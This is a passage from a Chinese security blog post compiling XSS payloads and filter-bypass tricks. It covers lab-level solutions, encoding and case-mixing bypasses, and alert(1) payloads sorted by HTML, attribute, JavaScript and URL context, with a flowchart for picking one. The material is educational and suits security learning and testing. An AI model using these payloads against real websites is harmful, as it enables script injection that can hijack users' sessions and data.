+<p><strong><font style="color:rgba(0, 0, 0, 0.9);">核心技巧：闭合属性 → 注入新属性</font></strong></p>
+<p><strong><font style="color:rgba(0, 0, 0, 0.9);">plain</font></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; on事件=代码        ← 闭合双引号</span><br><span class="line">&#x27; on事件=代码        ← 闭合单引号</span><br><span class="line">x on事件=代码        ← 无引号属性，空格分隔</span><br><span class="line">type=&quot;text&quot;          ← 覆盖 type=&quot;hidden&quot;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="第四组：JS-上下文逃逸（3关）"><a href="#第四组：JS-上下文逃逸（3关）" class="headerlink" title="第四组：JS 上下文逃逸（3关）"></a><font style="color:rgba(0, 0, 0, 0.9);">第四组：JS 上下文逃逸（3关）</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(245, 245, 245);">表格</font></strong></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">关卡</font></strong></th>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">过滤</font></strong></th>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">绕过方法</font></strong></th>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">Payload</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">第一关</font></strong></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">基础</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">直接闭合</font></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&quot;;alert(1);//&lt;/font&gt;</code></td>
+</tr>
+<tr>
+<td align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">第二关</font></strong></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">删除 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;(&lt;/font&gt;</code><br/><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;)&lt;/font&gt;</code><br/><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;;&lt;/font&gt;</code><br/><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;+&lt;/font&gt;</code><br/><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;-&lt;/font&gt;</code><br/><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;/&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.9);"> 空格</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">Tagged Template + 逗号运算符</font></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&quot;,a=alert&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.9);">1</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;,b=&quot;&lt;/font&gt;</code></td>
+</tr>
+<tr>
+<td align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">第三关</font></strong></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">“完美处理”</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">？</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">待解决</font></td>
+</tr>
+</tbody></table>
+<p><strong><font style="color:rgba(0, 0, 0, 0.9);">核心技巧：闭合 JS 字符串 → 注入 JS 代码</font></strong></p>
+<p><strong><font style="color:rgba(0, 0, 0, 0.9);">plain</font></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;代码;//</span><br><span class="line">&quot;,a=代码,b=&quot;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、常用绕过技巧大全"><a href="#三、常用绕过技巧大全" class="headerlink" title="三、常用绕过技巧大全"></a><font style="color:rgba(0, 0, 0, 0.9);">三、常用绕过技巧大全</font></h2><h3 id="1-双写绕过（删除型过滤）"><a href="#1-双写绕过（删除型过滤）" class="headerlink" title="1. 双写绕过（删除型过滤）"></a><font style="color:rgba(0, 0, 0, 0.9);">1. 双写绕过（删除型过滤）</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">HTML</font></strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">ipt&gt;alert(1)&lt;/scr<span class="tag">&lt;<span class="name">script</span>&gt;</span>ipt&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgba(0, 0, 0, 0.9);">过滤 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;script&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);"> → 删除后变成 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;script&gt;&lt;/font&gt;</code></p>
+<hr>
+<h3 id="2-大小写混合（不区分大小写过滤）"><a href="#2-大小写混合（不区分大小写过滤）" class="headerlink" title="2. 大小写混合（不区分大小写过滤）"></a><font style="color:rgba(0, 0, 0, 0.9);">2. 大小写混合（不区分大小写过滤）</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">HTML</font></strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="3-HTML-实体编码（前端字符串检测）"><a href="#3-HTML-实体编码（前端字符串检测）" class="headerlink" title="3. HTML 实体编码（前端字符串检测）"></a><font style="color:rgba(0, 0, 0, 0.9);">3. HTML 实体编码（前端字符串检测）</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(245, 245, 245);">表格</font></strong></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">字符</font></strong></th>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">实体</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&amp;lt;&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.9);"> 或 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&amp;#60;&lt;/font&gt;</code></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&gt;&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&amp;gt;&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.9);"> 或 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&amp;#62;&lt;/font&gt;</code></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&quot;&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&amp;quot;&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.9);"> 或 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&amp;#34;&lt;/font&gt;</code></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&#39;&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&amp;#39;&lt;/font&gt;</code></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;(&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&amp;#40;&lt;/font&gt;</code></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;)&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&amp;#41;&lt;/font&gt;</code></td>
+</tr>
+</tbody></table>
+<p><strong><font style="color:rgba(0, 0, 0, 0.9);">HTML</font></strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;lt;</span>scr<span class="symbol">&amp;#105;</span>pt<span class="symbol">&amp;gt;</span>al<span class="symbol">&amp;#101;</span>rt(1)<span class="symbol">&amp;lt;</span>/scr<span class="symbol">&amp;#105;</span>pt<span class="symbol">&amp;gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-URL-编码"><a href="#4-URL-编码" class="headerlink" title="4. URL 编码"></a><font style="color:rgba(0, 0, 0, 0.9);">4. URL 编码</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">plain</font></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3Cscript%3Ealert(1)%3C%2Fscript%3E</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="5-JavaScript-编码"><a href="#5-JavaScript-编码" class="headerlink" title="5. JavaScript 编码"></a><font style="color:rgba(0, 0, 0, 0.9);">5. JavaScript 编码</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(245, 245, 245);">表格</font></strong></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">编码方式</font></strong></th>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">示例</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">Unicode</font></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;\u003c&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.9);"> &#x3D; </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;&lt;/font&gt;</code></td>
+</tr>
+<tr>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">十六进制</font></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;\x3c&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.9);"> &#x3D; </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;&lt;/font&gt;</code></td>
+</tr>
+<tr>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">八进制</font></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;\74&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.9);"> &#x3D; </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;&lt;/font&gt;</code></td>
+</tr>
+<tr>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">Base64</font></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;atob(&#39;YWxlcnQoMSk=&#39;)&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.9);"> &#x3D; </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;alert(1)&lt;/font&gt;</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="6-绕过括号过滤"><a href="#6-绕过括号过滤" class="headerlink" title="6. 绕过括号过滤"></a><font style="color:rgba(0, 0, 0, 0.9);">6. 绕过括号过滤</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">JavaScript</font></strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Tagged Template Literal（ES6）</span></span><br><span class="line">alert<span class="string">`1`</span>           <span class="comment">// 等同于 alert([&#x27;1&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方括号 + 字符串</span></span><br><span class="line"><span class="variable language_">window</span>[<span class="string">&quot;alert&quot;</span>](<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方括号 + Base64</span></span><br><span class="line"><span class="variable language_">window</span>[<span class="title function_">atob</span>(<span class="string">&#x27;YWxlcnQ=&#x27;</span>)](<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="7-绕过引号过滤"><a href="#7-绕过引号过滤" class="headerlink" title="7. 绕过引号过滤"></a><font style="color:rgba(0, 0, 0, 0.9);">7. 绕过引号过滤</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">JavaScript</font></strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用反引号代替引号</span></span><br><span class="line">alert<span class="string">`1`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用 String.fromCharCode</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用 eval + 编码</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="title function_">atob</span>(<span class="string">&#x27;YWxlcnQoMSk=&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="8-绕过空格过滤"><a href="#8-绕过空格过滤" class="headerlink" title="8. 绕过空格过滤"></a><font style="color:rgba(0, 0, 0, 0.9);">8. 绕过空格过滤</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">HTML</font></strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 用 / 代替空格 --&gt;</span></span><br><span class="line">&lt;img/src=x/onerror=alert(1)&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 用换行代替空格 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">x</span></span></span><br><span class="line"><span class="tag"><span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="9-闭合标签技巧"><a href="#9-闭合标签技巧" class="headerlink" title="9. 闭合标签技巧"></a><font style="color:rgba(0, 0, 0, 0.9);">9. 闭合标签技巧</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">HTML</font></strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 闭合 textarea --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 闭合 script --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="10-伪协议"><a href="#10-伪协议" class="headerlink" title="10. 伪协议"></a><font style="color:rgba(0, 0, 0, 0.9);">10. 伪协议</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">HTML</font></strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、按上下文分类的-Payload"><a href="#四、按上下文分类的-Payload" class="headerlink" title="四、按上下文分类的 Payload"></a><font style="color:rgba(0, 0, 0, 0.9);">四、按上下文分类的 Payload</font></h2><h3 id="HTML-上下文（标签之间）"><a href="#HTML-上下文（标签之间）" class="headerlink" title="HTML 上下文（标签之间）"></a><font style="color:rgba(0, 0, 0, 0.9);">HTML 上下文（标签之间）</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">HTML</font></strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="HTML-属性上下文（属性值中）"><a href="#HTML-属性上下文（属性值中）" class="headerlink" title="HTML 属性上下文（属性值中）"></a><font style="color:rgba(0, 0, 0, 0.9);">HTML 属性上下文（属性值中）</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">HTML</font></strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=alert(1)</span><br><span class="line">&quot; onclick=alert(1)</span><br><span class="line">&quot; onfocus=alert(1) autofocus</span><br><span class="line">&quot; type=&quot;text&quot; onerror=alert(1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="JavaScript-上下文（字符串中）"><a href="#JavaScript-上下文（字符串中）" class="headerlink" title="JavaScript 上下文（字符串中）"></a><font style="color:rgba(0, 0, 0, 0.9);">JavaScript 上下文（字符串中）</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">JavaScript</font></strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;alert(1);//</span></span><br><span class="line"><span class="string">&quot;</span>,a=<span class="title function_">alert</span>(<span class="number">1</span>),b=<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;<span class="built_in">eval</span>(<span class="title function_">atob</span>(<span class="string">&#x27;YWxlcnQoMSk=&#x27;</span>));<span class="comment">//</span></span><br><span class="line"><span class="string">&quot;,a=alert`1`,b=&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="URL-上下文（href-src-中）"><a href="#URL-上下文（href-src-中）" class="headerlink" title="URL 上下文（href&#x2F;src 中）"></a><font style="color:rgba(0, 0, 0, 0.9);">URL 上下文（href&#x2F;src 中）</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">plain</font></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br><span class="line">javascript:alert`1`</span><br><span class="line">data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、快速选择-Payload-的流程"><a href="#五、快速选择-Payload-的流程" class="headerlink" title="五、快速选择 Payload 的流程"></a><font style="color:rgba(0, 0, 0, 0.9);">五、快速选择 Payload 的流程</font></h2><p><strong><font style="color:rgba(0, 0, 0, 0.9);">plain</font></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">开始</span><br><span class="line">  │</span><br><span class="line">  ▼</span><br><span class="line">输入被放在哪里？</span><br><span class="line">  │</span><br><span class="line">  ├── HTML 标签之间 ──→ 直接注入 &lt;script&gt; 或 &lt;img onerror&gt;</span><br><span class="line">  │</span><br><span class="line">  ├── HTML 属性值中 ──→ 闭合引号，注入 on事件</span><br><span class="line">  │</span><br><span class="line">  ├── JS 字符串中 ────→ 闭合字符串，注入代码</span><br><span class="line">  │</span><br><span class="line">  └── URL 中 ─────────→ 用 javascript: 伪协议</span><br><span class="line">  │</span><br><span class="line">  ▼</span><br><span class="line">有过滤吗？</span><br><span class="line">  │</span><br><span class="line">  ├── 删除 script ────→ 双写 &lt;scrscriptipt&gt;</span><br><span class="line">  │</span><br><span class="line">  ├── 删除 () ────────→ 用 alert`1` 或 window[&quot;alert&quot;]</span><br><span class="line">  │</span><br><span class="line">  ├── 删除 ; ─────────→ 用逗号运算符 ,</span><br><span class="line">  │</span><br><span class="line">  ├── 转义 &lt; &gt; ───────→ 用 &lt;img onerror&gt;（不需要 &lt;&gt;）</span><br><span class="line">  │</span><br><span class="line">  ├── 前端检测 ───────→ 用 HTML 实体编码</span><br><span class="line">  │</span><br><span class="line">  └── 全部转义 ───────→ 找其他注入点（Referer、Cookie）</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://jiege56.github.io">杰哥</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://jiege56.github.io/2026/07/20/xss%20payload%E5%A4%A7%E5%85%A8/">https://jiege56.github.io/2026/07/20/xss%20payload%E5%A4%A7%E5%85%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://jiege56.github.io" target="_blank">拾憶</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/XSS/">XSS</a><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post-share"><div class="social-share" data-image="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F/" title="域渗透实战笔记"><img class="cover" src="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">域渗透实战笔记</div></div><div class="info-2"><div class="info-item-1">一.域控环境配置域控主机：windows server 192.168.40.138 域成员：windows 10 192.168.40.129  准备域控制器（DC）  在 Windows Server 上安装 AD DS 角色： powershell    # 安装 Active Directory 域服务    Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools # 导入模块 Import-Module ADDSDeployment  # 创建新域（例如 corp.local） Install-ADDSForest `     -DomainName &quot;corp.local&quot; `     -DomainNetbiosName &quot;CORP&quot; `     -ForestMode &quot;WinThreshold&quot; `     -DomainMode &quot;WinThreshold&quot; `     -InstallDns:...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/111.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">杰哥</div><div class="author-info-description">人性背后是白云苍狗，愿你我都做生活的高手</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/jiege56" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1977691073@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%BB%84%EF%BC%9AXSS-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text">第一组：XSS 基础分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%BB%84%EF%BC%9A%E6%A0%87%E7%AD%BE%E4%B8%8E%E4%BA%8B%E4%BB%B6%EF%BC%88%E6%88%90%E5%B0%B1%E7%B3%BB%E7%BB%9F%EF%BC%89"><span 